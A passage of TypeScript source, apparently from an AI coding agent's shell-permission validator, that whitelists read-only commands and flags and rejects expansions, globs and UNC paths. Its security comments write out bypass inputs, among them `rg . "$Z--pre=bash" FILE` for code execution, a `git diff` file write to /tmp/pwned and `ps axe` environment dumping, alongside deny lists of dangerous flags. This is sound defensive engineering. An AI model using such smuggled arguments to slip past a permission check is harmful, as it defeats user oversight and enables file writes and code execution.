      '-t': 'string',
      '--terminal': 'string',
      '-u': 'string',
      '--euid': 'string',
      '-U': 'string',
      '--uid': 'string',
      '-x': 'none',
      '--exact': 'none',
      '-F': 'string',
      '--pidfile': 'string',
      '-L': 'none',
      '--logpidfile': 'none',
      '-r': 'string',
      '--runstates': 'string',
      '--ns': 'string',
      '--nslist': 'string',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },

  tput: {
    safeFlags: {
      '-T': 'string',
      '-V': 'none',
      '-x': 'none',
      // SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
      // It must NOT be in safeFlags because validateFlags unbundles combined
      // short flags (e.g., -xS → -x + -S), but the callback receives the raw
      // token '-xS' and only checks exact match 'token === "-S"'. Excluding -S
      // from safeFlags ensures validateFlags rejects it (bundled or not) before
      // the callback runs. The callback's -S check is defense-in-depth.
    },
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Capabilities that modify terminal state or could be harmful.
      // init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
      // rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
      // init/reset invoke internally — rs1 sends ESC c (full terminal reset).
      // clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
      // (redirect output to printer device). smcup/rmcup manipulate screen buffer.
      // pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
      // rf is reset file (analogous to if/init_file).
      const DANGEROUS_CAPABILITIES = new Set([
        'init',
        'reset',
        'rs1',
        'rs2',
        'rs3',
        'is1',
        'is2',
        'is3',
        'iprog',
        'if',
        'rf',
        'clear',
        'flash',
        'mc0',
        'mc4',
        'mc5',
        'mc5i',
        'mc5p',
        'pfkey',
        'pfloc',
        'pfx',
        'pfxl',
        'smcup',
        'rmcup',
      ])
      const flagsWithArgs = new Set(['-T'])
      let i = 0
      let afterDoubleDash = false
      while (i < args.length) {
        const token = args[i]!
        if (token === '--') {
          afterDoubleDash = true
          i++
        } else if (!afterDoubleDash && token.startsWith('-')) {
          // Defense-in-depth: block -S even if it somehow passes validateFlags
          if (token === '-S') return true
          // Also check for -S bundled with other flags (e.g., -xS)
          if (
            !token.startsWith('--') &&
            token.length > 2 &&
            token.includes('S')
          )
            return true
          if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          if (DANGEROUS_CAPABILITIES.has(token)) return true
          i++
        }
      }
      return false
    },
  },

  // ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
  // SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
  // are deliberately excluded. -F/--filter (read filter from file) also excluded.
  ss: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
      '-n': 'none',
      '--numeric': 'none',
      '-r': 'none',
      '--resolve': 'none',
      '-a': 'none',
      '--all': 'none',
      '-l': 'none',
      '--listening': 'none',
      '-o': 'none',
      '--options': 'none',
      '-e': 'none',
      '--extended': 'none',
      '-m': 'none',
      '--memory': 'none',
      '-p': 'none',
      '--processes': 'none',
      '-i': 'none',
      '--info': 'none',
      '-s': 'none',
      '--summary': 'none',
      '-4': 'none',
      '--ipv4': 'none',
      '-6': 'none',
      '--ipv6': 'none',
      '-0': 'none',
      '--packet': 'none',
      '-t': 'none',
      '--tcp': 'none',
      '-M': 'none',
      '--mptcp': 'none',
      '-S': 'none',
      '--sctp': 'none',
      '-u': 'none',
      '--udp': 'none',
      '-d': 'none',
      '--dccp': 'none',
      '-w': 'none',
      '--raw': 'none',
      '-x': 'none',
      '--unix': 'none',
      '--tipc': 'none',
      '--vsock': 'none',
      '-f': 'string',
      '--family': 'string',
      '-A': 'string',
      '--query': 'string',
      '--socket': 'string',
      '-Z': 'none',
      '--context': 'none',
      '-z': 'none',
      '--contexts': 'none',
      // SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
      // to switch network namespace. While isolated to forked process, too invasive.
      '-b': 'none',
      '--bpf': 'none',
      '-E': 'none',
      '--events': 'none',
      '-H': 'none',
      '--no-header': 'none',
      '-O': 'none',
      '--oneline': 'none',
      '--tipcinfo': 'none',
      '--tos': 'none',
      '--cgroup': 'none',
      '--inet-sockopt': 'none',
      // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
      // SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
      // SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
    },
  },

  // fd/fdfind — fast file finder (fd-find). Read-only search tool.
  // SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
  // (execute command with all results) are deliberately excluded.
  fd: { safeFlags: { ...FD_SAFE_FLAGS } },
  // fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
  fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },

  // #143 SEA: pyright removed from read-only allowlist (runs python3 in cwd)
  ...DOCKER_READ_ONLY_COMMANDS,
}

// gh commands are ant-only since they make network requests, which goes against
// the read-only validation principle of no network access
const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // All gh read-only commands from shared validation map
  ...GH_READ_ONLY_COMMANDS,
  // aki — Anthropic internal knowledge-base search CLI.
  // Network read-only (same policy as gh). --audit-csv omitted: writes to disk.
  aki: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-k': 'none',
      '--keyword': 'none',
      '-s': 'none',
      '--semantic': 'none',
      '--no-adaptive': 'none',
      '-n': 'number',
      '--limit': 'number',
      '-o': 'number',
      '--offset': 'number',
      '--source': 'string',
      '--exclude-source': 'string',
      '-a': 'string',
      '--after': 'string',
      '-b': 'string',
      '--before': 'string',
      '--collection': 'string',
      '--drive': 'string',
      '--folder': 'string',
      '--descendants': 'none',
      '-m': 'string',
      '--meta': 'string',
      '-t': 'string',
      '--threshold': 'string',
      '--kw-weight': 'string',
      '--sem-weight': 'string',
      '-j': 'none',
      '--json': 'none',
      '-c': 'none',
      '--chunk': 'none',
      '--preview': 'none',
      '-d': 'none',
      '--full-doc': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--stats': 'none',
      '-S': 'number',
      '--summarize': 'number',
      '--explain': 'none',
      '--examine': 'string',
      '--url': 'string',
      '--multi-turn': 'number',
      '--multi-turn-model': 'string',
      '--multi-turn-context': 'string',
      '--no-rerank': 'none',
      '--audit': 'none',
      '--local': 'none',
      '--staging': 'none',
    },
  },
}

function getCommandAllowlist(): Record<string, CommandConfig> {
  let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
  // On Windows, xargs can be used as a data-to-code bridge: if a file contains
  // a UNC path, `cat file | xargs cat` feeds that path to cat, triggering SMB
  // resolution. Since the UNC path is in file contents (not the command string),
  // regex-based detection cannot catch this.
  if (getPlatform() === 'windows') {
    const { xargs: _, ...rest } = allowlist
    allowlist = rest
  }
  if (process.env.USER_TYPE === 'ant') {
    return { ...allowlist, ...ANT_ONLY_COMMAND_ALLOWLIST }
  }
  return allowlist
}

/**
 * Commands that are safe to use as xargs targets for auto-approval.
 *
 * SECURITY: Only add a command to this list if it has NO flags that can:
 * 1. Write to files (e.g., find's -fprint, sed's -i)
 * 2. Execute code (e.g., find's -exec, awk's system(), perl's -e)
 * 3. Make network requests
 *
 * These commands must be purely read-only utilities. When xargs uses one of
 * these as a target, we stop validating flags after the target command
 * (see the `break` in isCommandSafeViaFlagParsing), so the command itself
 * must not have ANY dangerous flags, not just a safe subset.
 *
 * Each command was verified by checking its man page for dangerous capabilities.
 */
const SAFE_TARGET_COMMANDS_FOR_XARGS = [
  'echo', // Output only, no dangerous flags
  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
  'wc', // Read-only counting, no dangerous flags
  'grep', // Read-only search, no dangerous flags
  'head', // Read-only, no dangerous flags
  'tail', // Read-only (including -f follow), no dangerous flags
]

/**
 * Unified command validation function that replaces individual validator functions.
 * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
 * Handles combined flags, argument validation, and shell quoting bypass detection.
 */
/**
 * #76 SEA `A_r` (@290060500): commands whose read-only safety is preserved
 * even when arguments contain unquoted shell globs (`*`, `?`, `[...]`).
 * Commands NOT in this set (such as `rg` or `git grep`) must prompt when
 * arguments would be expanded as wildcards by the shell.
 */
export const SAFE_GLOB_READONLY_COMMANDS = new Set([
  'ls',
  'cat',
  'head',
  'tail',
  'wc',
  'stat',
  'grep',
  'egrep',
  'fgrep',
  'diff',
  'du',
  'df',
  'echo',
  'strings',
  'hexdump',
  'od',
  'nl',
  'cut',
  'column',
  'tr',
  'tac',
  'rev',
  'cmp',
  'basename',
  'dirname',
  'realpath',
  'readlink',
  'sha256sum',
  'sha1sum',
  'md5sum',
  'cd',
])

export function isCommandSafeViaFlagParsing(command: string): boolean {
  // Parse the command to get individual tokens using shell-quote for accuracy
  const parseResult = tryParseShellCommand(command, env => `$${env}`)
  if (!parseResult.success) return false

  let hasUnquotedGlob = false
  const parsed = parseResult.tokens.map(token => {
    if (typeof token !== 'string') {
      token = token as { op: 'glob'; pattern: string }
      if (token.op === 'glob') {
        hasUnquotedGlob = true
        return token.pattern
      }
    }
    return token
  })

  // If there are operators (pipes, redirects, etc.), it's not a simple command.
  // Breaking commands down into their constituent parts is handled upstream of
  // this function, so we reject anything with operators here.
  const hasOperators = parsed.some(token => typeof token !== 'string')
  if (hasOperators) {
    return false
  }

  // Now we know all tokens are strings
  const tokens = parsed as string[]

  if (tokens.length === 0) {
    return false
  }

  // #76 SEA `unt`: reject unquoted globs on commands not in SAFE_GLOB_READONLY_COMMANDS
  // (e.g. `rg foo *`, `git grep foo *` where `*` could expand to `--pre=bash`).
  if (hasUnquotedGlob && !SAFE_GLOB_READONLY_COMMANDS.has(tokens[0]!)) {
    return false
  }

  // Find matching command configuration
  let commandConfig: CommandConfig | undefined
  let commandTokens: number = 0

  // Check for multi-word commands first (e.g., "git diff", "git stash list")
  const allowlist = getCommandAllowlist()
  for (const [cmdPattern] of Object.entries(allowlist)) {
    const cmdTokens = cmdPattern.split(' ')
    if (tokens.length >= cmdTokens.length) {
      let matches = true
      for (let i = 0; i < cmdTokens.length; i++) {
        if (tokens[i] !== cmdTokens[i]) {
          matches = false
          break
        }
      }
      if (matches) {
        commandConfig = allowlist[cmdPattern]
        commandTokens = cmdTokens.length
        break
      }
    }
  }

  if (!commandConfig) {
    return false // Command not in allowlist
  }

  // Special handling for git ls-remote to reject URLs that could lead to data exfiltration
  if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
    // Check if any argument looks like a URL or remote specification
    for (let i = 2; i < tokens.length; i++) {
      const token = tokens[i]
      if (token && !token.startsWith('-')) {
        // Reject HTTP/HTTPS URLs
        if (token.includes('://')) {
          return false
        }
        // Reject SSH URLs like git@github.com:user/repo.git
        if (token.includes('@') || token.includes(':')) {
          return false
        }
        // Reject variable references
        if (token.includes('$')) {
          return false
        }
      }
    }
  }

  // SECURITY: Reject ANY token containing `$` (variable expansion). The
  // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
  // in tokens, but bash expands it at runtime (unset vars → empty string).
  // This parser differential defeats BOTH validateFlags and callbacks:
  //
  //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
  //       (starts with `$`) falls through as positional at ~:1730. Bash runs
  //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
  //
  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
  //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
  //
  //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
  //       tokens would NOT close this.
  //
  // We check ALL tokens after the command prefix. Any `$` means we cannot
  // determine the runtime token value, so we cannot verify read-only safety.
  // This check must run BEFORE validateFlags and BEFORE callbacks.
  for (let i = commandTokens; i < tokens.length; i++) {
    const token = tokens[i]
    if (!token) continue
    // Reject any token containing $ (variable expansion)
    if (token.includes('$')) {
      return false
    }
    // Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote strips quotes
    // → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
    // This is defense-in-depth with validateBraceExpansion in bashSecurity.ts.
    // We require BOTH `{` and `,` to avoid false positives on legitimate
    // patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
    // template, no `,`), `prefix-{}-suffix` (xargs, no `,`). Sequence form
    // `{1..5}` also needs checking (has `{` + `..`).
    if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
      return false
    }
  }

  // #76 SEA `Dot` (@284772170): guard Windows git `://` / sentinels and sentinel tokens
  const hasAnalysisSentinel = (t: string): boolean =>
    t.includes('__CMDSUB_OUTPUT__') ||
    t.includes('__TRACKED_VAR__') ||
    t.includes('__UNCERTAIN_VAR__')
  if (
    tokens[0] === 'git' &&
    getPlatform() === 'windows' &&
    tokens
      .slice(commandTokens)
      .some(t => /:[\\/]{2}/.test(t) || hasAnalysisSentinel(t)) &&
    getFeatureValue_CACHED_MAY_BE_STALE('tengu_jaunty_honey', true)
  ) {
    return false
  }
  if (tokens.slice(commandTokens).some(hasAnalysisSentinel)) {
    return false
  }
  if (getFeatureValue_CACHED_MAY_BE_STALE('tengu_amber_thimble', true)) {
    for (let i = commandTokens; i < tokens.length; i++) {
      const tok = tokens[i]
      if (!tok) continue
      if (tok === '--') {
        if (commandConfig.respectsDoubleDash !== false) break
        continue
      }
      if (
        tok.startsWith('-') &&
        tok.length > 1 &&
        !/^-[a-zA-Z0-9_-]/.test(tok)
      ) {
        return false
      }
    }
  }

  // Validate flags starting after the command tokens
  if (
    !validateFlags(tokens, commandTokens, commandConfig, {
      commandName: tokens[0],
      rawCommand: command,
      xargsTargetCommands:
        tokens[0] === 'xargs' ? SAFE_TARGET_COMMANDS_FOR_XARGS : undefined,
    })
  ) {
    return false
  }

  if (commandConfig.regex && !commandConfig.regex.test(command)) {
    return false
  }
  if (!commandConfig.regex && /`/.test(command)) {
    return false
  }
  // Block newlines and carriage returns in grep/rg patterns as they can be used for injection
  if (
    !commandConfig.regex &&
    (tokens[0] === 'rg' || tokens[0] === 'grep') &&
    /[\n\r]/.test(command)
  ) {
    return false
  }
  if (
    commandConfig.additionalCommandIsDangerousCallback &&
    commandConfig.additionalCommandIsDangerousCallback(
      command,
      tokens.slice(commandTokens),
    )
  ) {
    return false
  }

  return true
}

/**
 * Creates a regex pattern that matches safe invocations of a command.
 *
 * The regex ensures commands are invoked safely by blocking:
 * - Shell metacharacters that could lead to command injection or redirection
 * - Command substitution via backticks or $()
 * - Variable expansion that could contain malicious payloads
 * - Environment variable assignment bypasses (command=value)
 *
 * @param command The command name (e.g., 'date', 'npm list', 'ip addr')
 * @returns RegExp that matches safe invocations of the command
 */
function makeRegexForSafeCommand(command: string): RegExp {
  // Create regex pattern: /^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
  return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
}

// Simple commands that are safe for execution (converted to regex patterns using makeRegexForSafeCommand)
// WARNING: If you are adding new commands here, be very careful to ensure
// they are truly safe. This includes ensuring:
// 1. That they don't have any flags that allow file writing or command execution
// 2. Use makeRegexForSafeCommand() to ensure proper regex pattern creation
const READONLY_COMMANDS = [
  // Cross-platform commands from shared validation
  ...EXTERNAL_READONLY_COMMANDS,

  // Unix/bash-specific read-only commands (not shared because they don't exist in PowerShell)

  // Time and date
  'cal',
  'uptime',

  // File content viewing (relative paths handled separately)
  'cat',
  'head',
  'tail',
  'wc',
  'stat',
  'strings',
  'hexdump',
  'od',
  'nl',

  // System info
  'id',
  'uname',
  'free',
  'df',
  'du',
  'locale',
  'groups',
  'nproc',

  // Path information
  'basename',
  'dirname',
  'realpath',

  // Text processing
  'cut',
  'paste',
  'tr',
  'column',
  'tac', // Reverse cat — displays file contents in reverse line order
  'rev', // Reverse characters in each line
  'fold', // Wrap lines to specified width
  'expand', // Convert tabs to spaces
  'unexpand', // Convert spaces to tabs
  'fmt', // Simple text formatter — output to stdout only
  'comm', // Compare sorted files line by line
  'cmp', // Byte-by-byte file comparison
  'numfmt', // Number format conversion

  // Path information (additional)
  'readlink', // Resolve symlinks — displays target of symbolic link

  // File comparison
  'diff',

  // true and false, used to silence or create errors
  'true',
  'false',

  // Misc. safe commands
  'sleep',
  'type',
  'expr', // Evaluate expressions (arithmetic, string matching)
  'test', // Conditional evaluation (file checks, comparisons)
  'getconf', // Get system configuration values
  'seq', // Generate number sequences
  'tsort', // Topological sort
  'pr', // Paginate files for printing
]

// Complex commands that require custom regex patterns
// Warning: If possible, avoid adding new regexes here and prefer using COMMAND_ALLOWLIST
// instead. This allowlist-based approach to CLI flags is more secure and avoids
// vulns coming from gnu getopt_long.
const READONLY_COMMAND_REGEXES = new Set([
  // Convert simple commands to regex patterns using makeRegexForSafeCommand
  ...READONLY_COMMANDS.map(makeRegexForSafeCommand),

  // Echo that doesn't execute commands or use variables
  // Allow newlines in single quotes (safe) but not in double quotes (could be dangerous with variable expansion)
  // Also allow optional 2>&1 stderr redirection at the end
  /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,

  // Claude CLI help
  /^claude -h$/,
  /^claude --help$/,

  // Git readonly commands are now handled via COMMAND_ALLOWLIST with explicit flag validation
  // (git status, git blame, git ls-files, git config --get, git remote, git tag, git branch)

  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // Only allow flags, no input/output files

  // System info
  /^pwd$/,
  /^whoami$/,
  // env and printenv removed - could expose sensitive environment variables

  // Development tools version checking - exact match only, no suffix allowed.
  // SECURITY: `node -v --run <task>` would execute package.json scripts because
  // Node processes --run before -v. Python/python3 --version are also anchored
  // for defense-in-depth. These were previously in EXTERNAL_READONLY_COMMANDS which
  // flows through makeRegexForSafeCommand and permits arbitrary suffixes.
  /^node -v$/,
  /^node --version$/,
  /^python --version$/,
  /^python3 --version$/,

  // Misc. safe commands
  // tree command moved to COMMAND_ALLOWLIST for proper flag validation (blocks -o/--output)
  /^history(?:\s+\d+)?\s*$/, // Only allow bare history or history with numeric argument - prevents file writing
  /^alias$/,
  /^arch(?:\s+(?:--help|-h))?\s*$/, // Only allow arch with help flags or no arguments

  // Network commands - only allow exact commands with no arguments to prevent network manipulation
  /^ip addr$/, // Only allow "ip addr" with no additional arguments
  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // Allow ifconfig with interface name only (must start with letter)

  // JSON processing with jq - allow with inline filters and file arguments
  // File arguments are validated separately by pathValidation.ts
  // Allow pipes and complex expressions within quotes but prevent dangerous flags
  // Block command substitution - backticks are dangerous even in single quotes for jq
  // Block -f/--from-file, --rawfile, --slurpfile (read files into jq), --run-tests, -L/--library-path (load executable modules)
  // Block 'env' builtin and '$ENV' object which can access environment variables (defense in depth)
  /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,

  // Path commands (path validation ensures they're allowed)
  // cd command - allows changing to directories
  /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
  // ls command - allows listing directories
  /^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
  // find command - blocks dangerous flags
  // Allow escaped parentheses \( and \) for grouping, but block unescaped ones
  // NOTE: \\[()] must come BEFORE the character class to ensure \( is matched as an escaped paren,
  // not as backslash + paren (which would fail since paren is excluded from the character class)
  /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
])

/**
 * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
 * variables OUTSIDE the quote contexts where bash would treat them as literal.
 * These could expand to bypass our regex-based security checks.
 *
 * Glob examples:
 * - `python *` could expand to `python --help` if a file named `--help` exists
 * - `find ./ -?xec` could expand to `find ./ -exec` if such a file exists
 * Globs are literal inside BOTH single and double quotes.
 *
 * Variable expansion examples:
 * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
 *   with IFS word splitting, this smuggles positional args past "flags-only"
 *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
 * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
 * Variables are literal ONLY inside single quotes; they expand inside double
 * quotes and unquoted.
 *
 * The `$` check guards the READONLY_COMMAND_REGEXES fallback path. The `$`
 * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
 * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
 * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
 * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
 * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
 *
 * @param command The command string to check
 * @returns true if the command contains unquoted glob or expandable `$`
 */
export function containsUnquotedExpansion(
  command: string,
): 'variable' | 'glob' | false {
  // #104 SEA `tnt` (@290059975): distinguish 'variable' vs 'glob',
  // skip globs inside double quotes (literal in bash/zsh), handle backticks,
  // # comments at word boundaries, and \\\n line continuations.
  let inSingleQuote = false
  let inDoubleQuote = false
  let inBacktick = false
  let escaped = false
  let hasGlob = false
  let inBracket = false
  let atWordStart = true

  for (let i = 0; i < command.length; i++) {
    const currentChar = command[i]

    if (escaped) {
      escaped = false
      atWordStart = false
      continue
    }

    if (currentChar === '\\' && !inSingleQuote) {
      if (command[i + 1] === '\n') {
        i++
        continue
      }
      escaped = true
      continue
    }

    if (inBacktick) {
      if (currentChar === '`') {
        inBacktick = false
        atWordStart = false
      }
      continue
    }

    if (currentChar === '`' && !inSingleQuote) {
      inBacktick = true
      atWordStart = false
      continue
    }

    if (
      currentChar === '#' &&
      atWordStart &&
      !inSingleQuote &&
      !inDoubleQuote
    ) {
      while (i < command.length && command[i] !== '\n') i++
      atWordStart = true
      continue
    }

    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      atWordStart = false
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      atWordStart = false
      continue
    }

    if (inSingleQuote) {
      continue
    }

    if (currentChar === '$') {
      const next = command[i + 1]
      if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
        return 'variable'
      }
    }

    if (inDoubleQuote) {
      continue
    }

    if (
      currentChar === ' ' ||
      currentChar === '\t' ||
      currentChar === '\n' ||
      currentChar === '|' ||
      currentChar === '&' ||
      currentChar === ';' ||
      currentChar === '(' ||
      currentChar === ')' ||
      currentChar === '<' ||
      currentChar === '>'
    ) {
      inBracket = false
      atWordStart = true
      continue
    }

    atWordStart = false
    if (currentChar === '?' || currentChar === '*') {
      hasGlob = true
      continue
    }
    if (currentChar === '[') {
      inBracket = true
      continue
    }
    if (currentChar === ']' && inBracket) {
      hasGlob = true
    }
  }

  return hasGlob ? 'glob' : false
}

/**
 * Checks if a single command string is read-only based on READONLY_COMMAND_REGEXES.
 * Internal helper function that validates individual commands.
 *
 * @param command The command string to check
 * @returns true if the command is read-only
 */
/**
 * Official 2.1.319 #1754 (`pnt` / `Ffn`): strip plain `timeout DURATION` prefix
 * from read-only commands (e.g. `timeout 30 rg foo`), skipping shell builtins
 * (`[[`, `alias`, `cd`, `help`, `history`, `type`) and option-bearing `timeout`.
 */
const TIMEOUT_DURATION_RE = /^\d+(?:\.\d+)?[smhd]?$/
const TIMEOUT_EXCLUDED_BUILTINS = new Set([
  '[[',
  'alias',
  'cd',
  'help',
  'history',
  'type',
])
const PLAIN_TIMEOUT_PREFIX_RE =
  /^timeout[ \t]+(\d+(?:\.\d+)?[smhd]?)[ \t]+([\s\S]+)$/

export function stripPlainTimeoutPrefix(command: string): string {
  let current = command.trim()
  for (;;) {
    const match = PLAIN_TIMEOUT_PREFIX_RE.exec(current)
    if (!match) break
    const rest = match[2]!.trimStart()
    const nextToken = rest.split(/\s+/)[0] ?? ''
    if (
      !nextToken ||
      nextToken.startsWith('-') ||
      TIMEOUT_EXCLUDED_BUILTINS.has(nextToken)
    ) {
      break
    }
    current = rest
  }
  return current
}

export function stripPlainTimeoutArgv(argv: readonly string[]): string[] {
  let current = [...argv]
  while (
    current[0] === 'timeout' &&
    TIMEOUT_DURATION_RE.test(current[1] ?? '') &&
    current[2] !== undefined &&
    !current[2].startsWith('-') &&
    !TIMEOUT_EXCLUDED_BUILTINS.has(current[2])
  ) {
    current = current.slice(2)
  }
  return current
}

/**
 * Official 2.1.321 #1900 (`Cpn` / `EDo`):
 * Expand double-quoted `"$PWD"` or `"$PWD/<safe_subpath>"` to the current
 * working directory for read-only / path validation when no `cd` precedes it
 * and `PWD` is not otherwise referenced in the command.
 */
const SAFE_DOUBLE_QUOTED_PWD_RE = /"\$PWD((?:\/[^"$`\\\r\n]*)?)"/g
const SAFE_PWD_CWD_CHARS_RE = /^[^"$`\\\r\n]+$/

export function expandSafeDoubleQuotedPwd(
  command: string,
  cwd: string,
): string {
  if (!command.includes('"$PWD')) return command
  if (!SAFE_PWD_CWD_CHARS_RE.test(cwd)) return command
  const withoutSafePwd = command.replace(SAFE_DOUBLE_QUOTED_PWD_RE, '')
  if (withoutSafePwd.includes('PWD')) return command
  return command.replace(
    SAFE_DOUBLE_QUOTED_PWD_RE,
    (_m, suffix: string) => `"${cwd}${suffix}"`,
  )
}

/**
 * Official 2.1.323 #2135 (`upn` / `dnt` / `cpn`):
 * On Windows, file-reading commands that accept a path list (`-c`/`--check`,
 * `@file`, `--files0-from`) or wildcard expansion cannot be auto-allowed as
 * read-only because Windows path-list / glob expansion can traverse arbitrary
 * paths outside permission checks.
 */
function matchesLongOptionPrefix(arg: string, longOpt: string): boolean {
  const eqIdx = arg.indexOf('=')
  const head = eqIdx >= 0 ? arg.slice(0, eqIdx) : arg
  return head.length > 2 && longOpt.startsWith(head)
}

const isCheckFlag = (arg: string): boolean =>
  /^-[^-]*c/.test(arg) || matchesLongOptionPrefix(arg, '--check')

const isFiles0FromFlag = (arg: string): boolean =>
  matchesLongOptionPrefix(arg, '--files0-from')

const WINDOWS_PATH_LIST_READ_COMMANDS = new Map<
  string,
  (arg: string) => boolean
>([
  ['sha256sum', isCheckFlag],
  ['sha1sum', isCheckFlag],
  ['md5sum', isCheckFlag],
  ['strings', arg => arg.startsWith('@')],
  ['wc', isFiles0FromFlag],
  ['du', isFiles0FromFlag],
])

export function isWindowsPathListReadCommandBlocked(
  cmdName: string,
  args: readonly string[],
  hasGlob: boolean,
  platform: ReturnType<typeof getPlatform> = getPlatform(),
): boolean {
  if (platform !== 'windows') return false
  const checker = WINDOWS_PATH_LIST_READ_COMMANDS.get(cmdName)
  if (!checker) return false
  if (hasGlob) return true
  return args.some(arg => checker(arg))
}

function isCommandReadOnly(command: string): boolean {
  // Handle common stderr-to-stdout redirection pattern
  // This handles both "command 2>&1" at the end of a full command
  // and "command 2>&1" as part of a pipeline component
  let testCommand = stripPlainTimeoutPrefix(command.trim())
  if (testCommand.endsWith(' 2>&1')) {
    // Remove the stderr redirection for pattern matching
    testCommand = testCommand.slice(0, -5).trim()
  }

  // densable isCommandReadOnly: sI(token, /* forPath */ true) on redirects/argv.
  // Whole-command check uses path mode so single-separator mixed UNC forms
  // (e.g. `/\server\share`) still force a permission prompt on Windows.
  if (containsVulnerableUncPath(testCommand, true)) {
    return false
  }

  // Check for unquoted glob characters and expandable `$` variables that could
  // bypass our regex-based security checks. We can't know what these expand to
  // at runtime, so we can't verify the command is read-only.
  //
  // Globs: `python *` could expand to `python --help` if such a file exists.
  //
  // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
  // last arg of the previous command. With IFS word splitting, this smuggles
  // positional args past "flags-only" regexes like uniq's `\S+`. The `$` token
  // check inside isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
  // commands; hand-written regexes in READONLY_COMMAND_REGEXES (uniq, jq, cd)
  // have no such guard. See containsUnquotedExpansion for full analysis.
  const expansion = containsUnquotedExpansion(testCommand)
  if (expansion === 'variable') {
    return false
  }
  const splitTokens = testCommand.trim().split(/\s+/)
  const firstWord = splitTokens[0] ?? ''
  if (
    isWindowsPathListReadCommandBlocked(
      firstWord,
      splitTokens.slice(1),
      expansion === 'glob',
    )
  ) {
    return false
  }
  if (expansion === 'glob') {
    if (!SAFE_GLOB_READONLY_COMMANDS.has(firstWord)) {
      return false
    }
  }

  // Tools like git allow `--upload-pack=cmd` to be abbreviated as `--up=cmd`
  // Regex filters can be bypassed, so we use strict allowlist validation instead.
  // This requires defining a set of known safe flags. Claude can help with this,
  // but please look over it to ensure it didn't add any flags that allow file writes
  // code execution, or network requests.
  if (isCommandSafeViaFlagParsing(testCommand)) {
    return true
  }

